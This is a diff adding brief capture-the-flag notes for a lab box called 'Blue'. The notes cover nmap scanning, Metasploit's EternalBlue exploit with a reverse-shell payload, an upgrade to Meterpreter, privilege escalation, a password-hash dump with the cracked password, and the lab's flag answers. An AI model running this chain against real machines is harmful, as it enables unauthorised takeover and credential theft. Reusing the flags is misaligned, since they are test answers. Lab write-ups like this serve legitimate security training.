@@ -1,0 +1,57 @@
+Blue
+
+nmap -sn 10.10.226.245
+nmap -Pn -sV -sC 10.10.226.245
+nmap -Pn --script vuln -p445 10.10.226.245
+
+msfconsole
+search smb 
+0
+use 0
+set rhost
+exploit 
+vuln.
+
+searchsploit ms17-010 
+
+msfconsole -q
+msf6 > search ms17-010 
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/x64/shell/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.226.245
+msf6> set lhost 10.11.9.12
+msf6> exploit
+
+GOT Shell!!!
+
+WANT Meterpreter?
+
+Ctrl+z
+background session
+
+back
+use post/multi/manage/shell_to_meterpreter
+set session 2
+exploit
+
+meterpreter > getuid
+meterpreter > getsystem 
+meterpreter > hashdump 
+
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+https://crackstation.net/
+
+Jon:alqfna22
+
+meterpreter > search -f *.txt
+
+shell
+
+type c:\flag1.txt 
+type c:\Windows\System32\config\flag2.txt 
+type c:\Users\Jon\Documents\flag3.txt 
+
+flag{access_the_machine}
+flag{sam_database_elevated_access}
+flag{admin_documents_can_be_valuable}
